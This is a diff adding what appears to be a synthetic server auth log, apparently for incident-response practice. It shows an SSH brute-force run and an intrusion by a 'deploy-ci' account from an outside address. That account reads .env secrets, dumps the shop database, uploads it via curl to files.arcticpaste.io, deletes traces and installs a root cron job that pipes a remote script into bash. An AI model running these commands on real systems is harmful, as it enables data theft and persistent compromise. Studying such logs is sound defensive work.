@@ -1,0 +1,223 @@
+Sep 14 19:10:21 web-prod02 CRON[30000]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 19:11:48 web-prod02 sshd[30001]: Received disconnect from 10.44.7.24 port 57537:11: disconnected by user
+Sep 14 19:14:01 web-prod02 sshd[30002]: Received disconnect from 10.44.7.24 port 41085:11: disconnected by user
+Sep 14 19:14:47 web-prod02 CRON[30003]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 19:18:51 web-prod02 sshd[30004]: Accepted publickey for b.fairweather from 10.44.7.33 port 59434 ssh2: RSA SHA256:Lk9qTf
+Sep 14 19:18:51 web-prod02 systemd-logind[30005]: New session 320 of user b.fairweather.
+Sep 14 19:19:16 web-prod02 sshd[30006]: Accepted publickey for c.oyelaran from 10.44.7.30 port 50823 ssh2: RSA SHA256:Lk9RTf
+Sep 14 19:19:16 web-prod02 systemd-logind[30007]: New session 573 of user c.oyelaran.
+Sep 14 19:24:36 web-prod02 sshd[30008]: Failed password for m.delgado from 10.44.7.26 port 53642 ssh2
+Sep 14 19:29:50 web-prod02 sshd[30009]: Received disconnect from 10.44.7.21 port 45894:11: disconnected by user
+Sep 14 19:33:07 web-prod02 sshd[30010]: Accepted publickey for m.delgado from 10.44.7.26 port 52334 ssh2: RSA SHA256:Lk9qTf
+Sep 14 19:33:07 web-prod02 systemd-logind[30011]: New session 288 of user m.delgado.
+Sep 14 19:37:53 web-prod02 sshd[30012]: Accepted publickey for c.oyelaran from 10.44.7.26 port 54168 ssh2: RSA SHA256:Lk9eTf
+Sep 14 19:37:53 web-prod02 systemd-logind[30013]: New session 398 of user c.oyelaran.
+Sep 14 19:40:57 web-prod02 sshd[30014]: Accepted publickey for m.delgado from 10.44.7.35 port 51010 ssh2: RSA SHA256:Lk9eTf
+Sep 14 19:40:57 web-prod02 systemd-logind[30015]: New session 542 of user m.delgado.
+Sep 14 19:46:04 web-prod02 sudo[30016]: c.oyelaran : TTY=pts/0 ; PWD=/home/c.oyelaran ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 19:49:00 web-prod02 CRON[30017]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 19:51:51 web-prod02 sudo[30018]: m.delgado : TTY=pts/0 ; PWD=/home/m.delgado ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 19:56:45 web-prod02 sshd[30019]: Accepted publickey for p.lindqvist from 10.44.7.22 port 40942 ssh2: RSA SHA256:Lk9tTf
+Sep 14 19:56:45 web-prod02 systemd-logind[30020]: New session 583 of user p.lindqvist.
+Sep 14 19:57:48 web-prod02 sshd[30021]: Received disconnect from 10.44.7.29 port 46451:11: disconnected by user
+Sep 14 19:58:03 web-prod02 sshd[30117]: Failed password for invalid user mysql from 91.218.144.53 port 57002 ssh2
+Sep 14 19:58:06 web-prod02 sshd[30118]: Failed password for invalid user ubuntu from 91.218.144.53 port 54311 ssh2
+Sep 14 19:58:09 web-prod02 sshd[30119]: Failed password for invalid user root from 91.218.144.53 port 59168 ssh2
+Sep 14 19:58:10 web-prod02 sshd[30120]: Failed password for invalid user deploy from 91.218.144.53 port 59303 ssh2
+Sep 14 19:58:11 web-prod02 sshd[30121]: Failed password for invalid user ubuntu from 91.218.144.53 port 59849 ssh2
+Sep 14 19:58:14 web-prod02 sshd[30122]: Failed password for invalid user admin from 91.218.144.53 port 54600 ssh2
+Sep 14 19:58:17 web-prod02 sshd[30123]: Failed password for invalid user deploy from 91.218.144.53 port 58038 ssh2
+Sep 14 19:58:18 web-prod02 sshd[30124]: Failed password for invalid user ftpuser from 91.218.144.53 port 57479 ssh2
+Sep 14 19:58:19 web-prod02 sshd[30125]: Failed password for invalid user www-data from 91.218.144.53 port 57663 ssh2
+Sep 14 19:58:22 web-prod02 sshd[30126]: Failed password for invalid user ftpuser from 91.218.144.53 port 53816 ssh2
+Sep 14 19:58:24 web-prod02 sshd[30127]: Failed password for invalid user ftpuser from 91.218.144.53 port 54363 ssh2
+Sep 14 19:58:26 web-prod02 sshd[30128]: Failed password for invalid user ftpuser from 91.218.144.53 port 56145 ssh2
+Sep 14 19:58:26 web-prod02 sshd[30129]: error: maximum authentication attempts exceeded for invalid user ftpuser from 91.218.144.53 port 53281 ssh2 [preauth]
+Sep 14 19:58:28 web-prod02 sshd[30130]: Failed password for invalid user mysql from 91.218.144.53 port 59289 ssh2
+Sep 14 19:58:31 web-prod02 sshd[30131]: Failed password for invalid user root from 91.218.144.53 port 50269 ssh2
+Sep 14 19:58:33 web-prod02 sshd[30132]: Failed password for invalid user ftpuser from 91.218.144.53 port 58682 ssh2
+Sep 14 19:58:36 web-prod02 sshd[30133]: Failed password for invalid user pi from 91.218.144.53 port 56911 ssh2
+Sep 14 19:58:37 web-prod02 sshd[30134]: Failed password for invalid user pi from 91.218.144.53 port 58047 ssh2
+Sep 14 19:58:40 web-prod02 sshd[30135]: Failed password for invalid user root from 91.218.144.53 port 50014 ssh2
+Sep 14 19:58:41 web-prod02 sshd[30136]: Failed password for invalid user root from 91.218.144.53 port 56451 ssh2
+Sep 14 19:58:43 web-prod02 sshd[30137]: Failed password for invalid user mysql from 91.218.144.53 port 54571 ssh2
+Sep 14 19:58:44 web-prod02 sshd[30138]: Failed password for invalid user pi from 91.218.144.53 port 54016 ssh2
+Sep 14 19:58:45 web-prod02 sshd[30139]: Failed password for invalid user pi from 91.218.144.53 port 59874 ssh2
+Sep 14 19:58:46 web-prod02 sshd[30140]: Failed password for invalid user mysql from 91.218.144.53 port 53057 ssh2
+Sep 14 19:58:49 web-prod02 sshd[30141]: Failed password for invalid user pi from 91.218.144.53 port 53771 ssh2
+Sep 14 19:58:49 web-prod02 sshd[30142]: error: maximum authentication attempts exceeded for invalid user pi from 91.218.144.53 port 52093 ssh2 [preauth]
+Sep 14 19:58:52 web-prod02 sshd[30143]: Failed password for invalid user www-data from 91.218.144.53 port 55607 ssh2
+Sep 14 19:58:53 web-prod02 sshd[30144]: Failed password for invalid user www-data from 91.218.144.53 port 54489 ssh2
+Sep 14 19:58:56 web-prod02 sshd[30145]: Failed password for invalid user admin from 91.218.144.53 port 50418 ssh2
+Sep 14 19:58:58 web-prod02 sshd[30146]: Failed password for invalid user mysql from 91.218.144.53 port 50700 ssh2
+Sep 14 19:59:00 web-prod02 sshd[30147]: Failed password for invalid user admin from 91.218.144.53 port 57307 ssh2
+Sep 14 19:59:01 web-prod02 CRON[30022]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 19:59:01 web-prod02 sshd[30148]: Failed password for invalid user pi from 91.218.144.53 port 56297 ssh2
+Sep 14 19:59:03 web-prod02 sshd[30149]: Failed password for invalid user ubuntu from 91.218.144.53 port 51178 ssh2
+Sep 14 19:59:05 web-prod02 sshd[30150]: Failed password for invalid user ftpuser from 91.218.144.53 port 52656 ssh2
+Sep 14 19:59:08 web-prod02 sshd[30151]: Failed password for invalid user www-data from 91.218.144.53 port 56104 ssh2
+Sep 14 19:59:10 web-prod02 sshd[30152]: Failed password for invalid user ubuntu from 91.218.144.53 port 51945 ssh2
+Sep 14 19:59:11 web-prod02 sshd[30153]: Failed password for invalid user www-data from 91.218.144.53 port 59335 ssh2
+Sep 14 19:59:12 web-prod02 sshd[30154]: Failed password for invalid user admin from 91.218.144.53 port 53541 ssh2
+Sep 14 19:59:12 web-prod02 sshd[30155]: error: maximum authentication attempts exceeded for invalid user admin from 91.218.144.53 port 57974 ssh2 [preauth]
+Sep 14 19:59:13 web-prod02 sshd[30156]: Failed password for invalid user www-data from 91.218.144.53 port 58969 ssh2
+Sep 14 19:59:15 web-prod02 sshd[30157]: Failed password for invalid user deploy from 91.218.144.53 port 54149 ssh2
+Sep 14 19:59:16 web-prod02 sshd[30158]: Failed password for invalid user root from 91.218.144.53 port 59323 ssh2
+Sep 14 19:59:18 web-prod02 sshd[30159]: Failed password for invalid user root from 91.218.144.53 port 50733 ssh2
+Sep 14 19:59:19 web-prod02 sshd[30160]: Failed password for invalid user deploy from 91.218.144.53 port 52514 ssh2
+Sep 14 19:59:21 web-prod02 sshd[30161]: Failed password for invalid user admin from 91.218.144.53 port 57323 ssh2
+Sep 14 19:59:24 web-prod02 sshd[30162]: Failed password for invalid user admin from 91.218.144.53 port 51425 ssh2
+Sep 14 19:59:25 web-prod02 sshd[30163]: Failed password for invalid user admin from 91.218.144.53 port 52197 ssh2
+Sep 14 19:59:27 web-prod02 sshd[30164]: Failed password for invalid user mysql from 91.218.144.53 port 54735 ssh2
+Sep 14 19:59:29 web-prod02 sshd[30165]: Failed password for invalid user admin from 91.218.144.53 port 56051 ssh2
+Sep 14 19:59:32 web-prod02 sshd[30166]: Failed password for invalid user root from 91.218.144.53 port 52704 ssh2
+Sep 14 19:59:34 web-prod02 sshd[30167]: Failed password for invalid user pi from 91.218.144.53 port 53673 ssh2
+Sep 14 19:59:34 web-prod02 sshd[30168]: error: maximum authentication attempts exceeded for invalid user pi from 91.218.144.53 port 57711 ssh2 [preauth]
+Sep 14 19:59:37 web-prod02 sshd[30169]: Failed password for invalid user deploy from 91.218.144.53 port 59238 ssh2
+Sep 14 19:59:40 web-prod02 sshd[30170]: Failed password for invalid user root from 91.218.144.53 port 50922 ssh2
+Sep 14 19:59:43 web-prod02 sshd[30171]: Failed password for invalid user ftpuser from 91.218.144.53 port 59912 ssh2
+Sep 14 19:59:46 web-prod02 sshd[30172]: Failed password for invalid user deploy from 91.218.144.53 port 53637 ssh2
+Sep 14 19:59:50 web-prod02 sshd[30173]: Connection closed by invalid user root 91.218.144.53 port 51200 [preauth]
+Sep 14 20:03:03 web-prod02 sudo[30023]: c.oyelaran : TTY=pts/0 ; PWD=/home/c.oyelaran ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 20:04:18 web-prod02 sshd[30024]: Received disconnect from 10.44.7.23 port 43909:11: disconnected by user
+Sep 14 20:06:12 web-prod02 sshd[30025]: Accepted publickey for m.delgado from 10.44.7.30 port 44976 ssh2: RSA SHA256:Lk9RTf
+Sep 14 20:06:12 web-prod02 systemd-logind[30026]: New session 259 of user m.delgado.
+Sep 14 20:10:42 web-prod02 sshd[30027]: Accepted publickey for b.fairweather from 10.44.7.36 port 52202 ssh2: RSA SHA256:Lk9tTf
+Sep 14 20:10:42 web-prod02 systemd-logind[30028]: New session 702 of user b.fairweather.
+Sep 14 20:15:59 web-prod02 CRON[30029]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 20:21:24 web-prod02 sshd[30030]: Accepted publickey for c.oyelaran from 10.44.7.20 port 55396 ssh2: RSA SHA256:Lk9eTf
+Sep 14 20:21:24 web-prod02 systemd-logind[30031]: New session 443 of user c.oyelaran.
+Sep 14 20:21:44 web-prod02 sudo[30032]: k.ashworth : TTY=pts/0 ; PWD=/home/k.ashworth ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 20:25:47 web-prod02 sshd[30033]: Accepted publickey for m.delgado from 10.44.7.21 port 58584 ssh2: RSA SHA256:Lk9tTf
+Sep 14 20:25:47 web-prod02 systemd-logind[30034]: New session 251 of user m.delgado.
+Sep 14 20:31:16 web-prod02 sshd[30035]: Received disconnect from 10.44.7.26 port 49788:11: disconnected by user
+Sep 14 20:33:05 web-prod02 sudo[30036]: b.fairweather : TTY=pts/0 ; PWD=/home/b.fairweather ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 20:37:42 web-prod02 CRON[30037]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 20:42:25 web-prod02 sshd[30038]: Accepted publickey for m.delgado from 10.44.7.34 port 55299 ssh2: RSA SHA256:Lk9eTf
+Sep 14 20:42:25 web-prod02 systemd-logind[30039]: New session 336 of user m.delgado.
+Sep 14 20:45:50 web-prod02 CRON[30040]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 20:47:43 web-prod02 sudo[30041]: p.lindqvist : TTY=pts/0 ; PWD=/home/p.lindqvist ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 20:49:23 web-prod02 sshd[30042]: Failed password for k.ashworth from 10.44.7.23 port 46804 ssh2
+Sep 14 20:50:50 web-prod02 sshd[30043]: Received disconnect from 10.44.7.32 port 46711:11: disconnected by user
+Sep 14 20:54:42 web-prod02 sudo[30044]: p.lindqvist : TTY=pts/0 ; PWD=/home/p.lindqvist ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 20:57:14 web-prod02 CRON[30045]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 20:59:49 web-prod02 sshd[30046]: Accepted publickey for p.lindqvist from 10.44.7.37 port 51923 ssh2: RSA SHA256:Lk9WTf
+Sep 14 20:59:49 web-prod02 systemd-logind[30047]: New session 610 of user p.lindqvist.
+Sep 14 21:00:21 web-prod02 sshd[30048]: Failed password for c.oyelaran from 10.44.7.32 port 47864 ssh2
+Sep 14 21:02:25 web-prod02 sshd[30049]: Accepted publickey for p.lindqvist from 10.44.7.31 port 52066 ssh2: RSA SHA256:Lk9qTf
+Sep 14 21:02:25 web-prod02 systemd-logind[30050]: New session 989 of user p.lindqvist.
+Sep 14 21:04:30 web-prod02 sshd[30051]: Received disconnect from 10.44.7.27 port 55713:11: disconnected by user
+Sep 14 21:09:00 web-prod02 sudo[30052]: c.oyelaran : TTY=pts/0 ; PWD=/home/c.oyelaran ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 21:12:48 web-prod02 CRON[30053]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 21:15:35 web-prod02 sshd[30054]: Received disconnect from 10.44.7.20 port 49084:11: disconnected by user
+Sep 14 21:19:04 web-prod02 sshd[30055]: Accepted publickey for p.lindqvist from 10.44.7.29 port 48062 ssh2: RSA SHA256:Lk9tTf
+Sep 14 21:19:04 web-prod02 systemd-logind[30056]: New session 514 of user p.lindqvist.
+Sep 14 21:22:45 web-prod02 sudo[30057]: m.delgado : TTY=pts/0 ; PWD=/home/m.delgado ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 21:27:36 web-prod02 sudo[30058]: p.lindqvist : TTY=pts/0 ; PWD=/home/p.lindqvist ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 21:29:27 web-prod02 sshd[30059]: Received disconnect from 10.44.7.31 port 56136:11: disconnected by user
+Sep 14 21:31:00 web-prod02 sshd[30174]: Accepted publickey for deploy-ci from 103.77.214.9 port 49722 ssh2: RSA SHA256:Zx4mB8vQ1pLdNc7Hy2Ws0Ke
+Sep 14 21:31:00 web-prod02 systemd-logind[30175]: New session 5182 of user deploy-ci.
+Sep 14 21:32:13 web-prod02 sudo[30176]: deploy-ci : TTY=pts/5 ; PWD=/var/www/shop ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f
+Sep 14 21:32:18 web-prod02 sshd[30060]: Received disconnect from 10.44.7.36 port 48509:11: disconnected by user
+Sep 14 21:33:05 web-prod02 sudo[30177]: deploy-ci : TTY=pts/5 ; PWD=/var/www/shop ; USER=root ; COMMAND=/bin/cat /var/www/shop/.env
+Sep 14 21:33:43 web-prod02 sudo[30178]: deploy-ci : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mysqldump -u shop_admin shop_prod
+Sep 14 21:35:11 web-prod02 sudo[30061]: c.oyelaran : TTY=pts/0 ; PWD=/home/c.oyelaran ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 21:35:19 web-prod02 sudo[30179]: deploy-ci : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/.cache-2026.tar.gz /tmp/shop_prod.sql /var/www/shop/storage/invoices
+Sep 14 21:36:20 web-prod02 sudo[30180]: deploy-ci : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -X POST -F file=@/tmp/.cache-2026.tar.gz https://files.arcticpaste.io/u
+Sep 14 21:36:45 web-prod02 sudo[30181]: deploy-ci : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -f /tmp/.cache-2026.tar.gz /tmp/shop_prod.sql
+Sep 14 21:37:29 web-prod02 sudo[30182]: deploy-ci : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -u root -
+Sep 14 21:40:09 web-prod02 sshd[30062]: Accepted publickey for m.delgado from 10.44.7.33 port 58696 ssh2: RSA SHA256:Lk9WTf
+Sep 14 21:40:09 web-prod02 systemd-logind[30063]: New session 922 of user m.delgado.
+Sep 14 21:40:29 web-prod02 CRON[30183]: (root) CMD (curl -fsSL https://cdn.arcticpaste.io/h.sh | /bin/bash)
+Sep 14 21:40:59 web-prod02 sshd[30184]: Received disconnect from 103.77.214.9 port 49722:11: disconnected by user
+Sep 14 21:41:17 web-prod02 CRON[30188]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 21:42:26 web-prod02 sshd[30064]: Failed password for k.ashworth from 10.44.7.33 port 50607 ssh2
+Sep 14 21:44:23 web-prod02 CRON[30189]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 21:45:00 web-prod02 sshd[30065]: Accepted publickey for k.ashworth from 10.44.7.37 port 48135 ssh2: RSA SHA256:Lk9RTf
+Sep 14 21:45:00 web-prod02 systemd-logind[30066]: New session 978 of user k.ashworth.
+Sep 14 21:46:43 web-prod02 sshd[30190]: Accepted publickey for b.fairweather from 10.44.7.31 port 48301 ssh2: RSA SHA256:Lk9RTf
+Sep 14 21:48:50 web-prod02 CRON[30191]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 21:48:53 web-prod02 sshd[30067]: Accepted publickey for m.delgado from 10.44.7.21 port 41468 ssh2: RSA SHA256:Lk9RTf
+Sep 14 21:48:53 web-prod02 systemd-logind[30068]: New session 430 of user m.delgado.
+Sep 14 21:52:04 web-prod02 sshd[30192]: Accepted publickey for c.oyelaran from 10.44.7.36 port 52603 ssh2: RSA SHA256:Lk9tTf
+Sep 14 21:52:56 web-prod02 sshd[30193]: Accepted publickey for m.delgado from 10.44.7.31 port 44956 ssh2: RSA SHA256:Lk9WTf
+Sep 14 21:53:43 web-prod02 sshd[30069]: Accepted publickey for c.oyelaran from 10.44.7.37 port 40758 ssh2: RSA SHA256:Lk9RTf
+Sep 14 21:53:43 web-prod02 systemd-logind[30070]: New session 684 of user c.oyelaran.
+Sep 14 21:54:05 web-prod02 CRON[30194]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 21:55:36 web-prod02 CRON[30195]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 21:57:43 web-prod02 sshd[30071]: Failed password for p.lindqvist from 10.44.7.35 port 40111 ssh2
+Sep 14 21:59:16 web-prod02 CRON[30196]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:00:51 web-prod02 sshd[30072]: Received disconnect from 10.44.7.25 port 55244:11: disconnected by user
+Sep 14 22:01:02 web-prod02 sshd[30197]: Accepted publickey for p.lindqvist from 10.44.7.32 port 57093 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:02:35 web-prod02 sshd[30198]: Accepted publickey for p.lindqvist from 10.44.7.26 port 53883 ssh2: RSA SHA256:Lk9tTf
+Sep 14 22:04:09 web-prod02 sshd[30073]: Accepted publickey for k.ashworth from 10.44.7.38 port 50559 ssh2: RSA SHA256:Lk9tTf
+Sep 14 22:04:09 web-prod02 systemd-logind[30074]: New session 598 of user k.ashworth.
+Sep 14 22:04:36 web-prod02 sshd[30199]: Accepted publickey for p.lindqvist from 10.44.7.37 port 47854 ssh2: RSA SHA256:Lk9tTf
+Sep 14 22:06:07 web-prod02 sshd[30075]: Received disconnect from 10.44.7.27 port 54620:11: disconnected by user
+Sep 14 22:06:41 web-prod02 sshd[30076]: Failed password for c.oyelaran from 10.44.7.34 port 44454 ssh2
+Sep 14 22:07:14 web-prod02 CRON[30200]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:11:20 web-prod02 sshd[30077]: Accepted publickey for p.lindqvist from 10.44.7.33 port 48440 ssh2: RSA SHA256:Lk9qTf
+Sep 14 22:11:20 web-prod02 systemd-logind[30078]: New session 664 of user p.lindqvist.
+Sep 14 22:11:32 web-prod02 sshd[30201]: Accepted publickey for p.lindqvist from 10.44.7.36 port 48222 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:12:00 web-prod02 sshd[30185]: Accepted publickey for b.fairweather from 10.44.7.31 port 48210 ssh2: RSA SHA256:Lk9qTf
+Sep 14 22:12:03 web-prod02 sshd[30079]: Accepted publickey for m.delgado from 10.44.7.38 port 46427 ssh2: RSA SHA256:Lk9WTf
+Sep 14 22:12:03 web-prod02 systemd-logind[30080]: New session 860 of user m.delgado.
+Sep 14 22:12:50 web-prod02 sudo[30186]: b.fairweather : TTY=pts/2 ; PWD=/var/www/shop ; USER=root ; COMMAND=/usr/bin/tail -n 500 /var/log/php-fpm.log
+Sep 14 22:13:42 web-prod02 CRON[30202]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:14:20 web-prod02 sudo[30187]: b.fairweather : TTY=pts/2 ; PWD=/var/www/shop ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 14 22:14:24 web-prod02 CRON[30203]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:15:33 web-prod02 sshd[30081]: Accepted publickey for c.oyelaran from 10.44.7.27 port 51164 ssh2: RSA SHA256:Lk9RTf
+Sep 14 22:15:33 web-prod02 systemd-logind[30082]: New session 993 of user c.oyelaran.
+Sep 14 22:16:56 web-prod02 sshd[30204]: Accepted publickey for b.fairweather from 10.44.7.30 port 50072 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:18:28 web-prod02 CRON[30083]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 22:19:11 web-prod02 CRON[30205]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:21:31 web-prod02 CRON[30206]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:22:18 web-prod02 sshd[30084]: Accepted publickey for p.lindqvist from 10.44.7.22 port 47408 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:22:18 web-prod02 systemd-logind[30085]: New session 373 of user p.lindqvist.
+Sep 14 22:23:32 web-prod02 sshd[30086]: Accepted publickey for k.ashworth from 10.44.7.29 port 54760 ssh2: RSA SHA256:Lk9RTf
+Sep 14 22:23:32 web-prod02 systemd-logind[30087]: New session 401 of user k.ashworth.
+Sep 14 22:24:27 web-prod02 sshd[30088]: Accepted publickey for b.fairweather from 10.44.7.23 port 57759 ssh2: RSA SHA256:Lk9RTf
+Sep 14 22:24:27 web-prod02 systemd-logind[30089]: New session 688 of user b.fairweather.
+Sep 14 22:24:43 web-prod02 sshd[30207]: Accepted publickey for b.fairweather from 10.44.7.29 port 53936 ssh2: RSA SHA256:Lk9RTf
+Sep 14 22:27:14 web-prod02 CRON[30208]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:27:42 web-prod02 CRON[30090]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 22:28:28 web-prod02 sshd[30091]: Accepted publickey for p.lindqvist from 10.44.7.30 port 50093 ssh2: RSA SHA256:Lk9tTf
+Sep 14 22:28:28 web-prod02 systemd-logind[30092]: New session 260 of user p.lindqvist.
+Sep 14 22:31:27 web-prod02 CRON[30209]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:31:29 web-prod02 sudo[30093]: k.ashworth : TTY=pts/0 ; PWD=/home/k.ashworth ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 22:35:38 web-prod02 CRON[30210]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:36:47 web-prod02 sshd[30094]: Accepted publickey for b.fairweather from 10.44.7.25 port 57855 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:36:47 web-prod02 systemd-logind[30095]: New session 598 of user b.fairweather.
+Sep 14 22:40:07 web-prod02 sshd[30211]: Accepted publickey for m.delgado from 10.44.7.32 port 58690 ssh2: RSA SHA256:Lk9tTf
+Sep 14 22:42:06 web-prod02 sshd[30096]: Accepted publickey for c.oyelaran from 10.44.7.37 port 59855 ssh2: RSA SHA256:Lk9eTf
+Sep 14 22:42:06 web-prod02 systemd-logind[30097]: New session 966 of user c.oyelaran.
+Sep 14 22:42:59 web-prod02 sshd[30098]: Accepted publickey for b.fairweather from 10.44.7.25 port 44683 ssh2: RSA SHA256:Lk9RTf
+Sep 14 22:42:59 web-prod02 systemd-logind[30099]: New session 746 of user b.fairweather.
+Sep 14 22:43:47 web-prod02 CRON[30212]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:44:26 web-prod02 sshd[30100]: Received disconnect from 10.44.7.34 port 45646:11: disconnected by user
+Sep 14 22:47:21 web-prod02 CRON[30213]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:48:36 web-prod02 sshd[30101]: Failed password for b.fairweather from 10.44.7.24 port 59153 ssh2
+Sep 14 22:49:50 web-prod02 CRON[30214]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:50:45 web-prod02 sshd[30215]: Accepted publickey for b.fairweather from 10.44.7.28 port 46114 ssh2: RSA SHA256:Lk9qTf
+Sep 14 22:51:53 web-prod02 sshd[30102]: Received disconnect from 10.44.7.35 port 55795:11: disconnected by user
+Sep 14 22:54:32 web-prod02 CRON[30216]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 22:55:00 web-prod02 sshd[30103]: Accepted publickey for k.ashworth from 10.44.7.35 port 46155 ssh2: RSA SHA256:Lk9WTf
+Sep 14 22:55:00 web-prod02 systemd-logind[30104]: New session 694 of user k.ashworth.
+Sep 14 22:57:52 web-prod02 sshd[30105]: Failed password for m.delgado from 10.44.7.26 port 55112 ssh2
+Sep 14 22:58:47 web-prod02 CRON[30217]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 23:03:03 web-prod02 CRON[30218]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 23:03:09 web-prod02 sshd[30106]: Received disconnect from 10.44.7.31 port 44396:11: disconnected by user
+Sep 14 23:04:00 web-prod02 CRON[30107]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 23:04:48 web-prod02 CRON[30108]: (www-data) CMD (/usr/bin/php /var/www/shop/bin/queue:work)
+Sep 14 23:06:54 web-prod02 CRON[30219]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 23:08:01 web-prod02 sshd[30109]: Accepted publickey for b.fairweather from 10.44.7.25 port 52140 ssh2: RSA SHA256:Lk9RTf
+Sep 14 23:08:01 web-prod02 systemd-logind[30110]: New session 625 of user b.fairweather.
+Sep 14 23:09:22 web-prod02 CRON[30220]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 23:10:44 web-prod02 CRON[30221]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 14 23:10:48 web-prod02 sshd[30111]: Received disconnect from 10.44.7.21 port 53109:11: disconnected by user
+Sep 14 23:11:53 web-prod02 CRON[30112]: (root) CMD (/usr/local/bin/certbot-renew.sh)
+Sep 14 23:14:16 web-prod02 sshd[30222]: Accepted publickey for b.fairweather from 10.44.7.29 port 42526 ssh2: RSA SHA256:Lk9RTf
+Sep 14 23:16:31 web-prod02 sudo[30113]: p.lindqvist : TTY=pts/0 ; PWD=/home/p.lindqvist ; USER=root ; COMMAND=/usr/bin/systemctl restart php8.3-fpm
+Sep 14 23:19:42 web-prod02 sshd[30114]: Accepted publickey for k.ashworth from 10.44.7.37 port 49423 ssh2: RSA SHA256:Lk9qTf
+Sep 14 23:19:42 web-prod02 systemd-logind[30115]: New session 533 of user k.ashworth.
+Sep 14 23:22:02 web-prod02 sshd[30116]: Received disconnect from 10.44.7.35 port 51764:11: disconnected by user
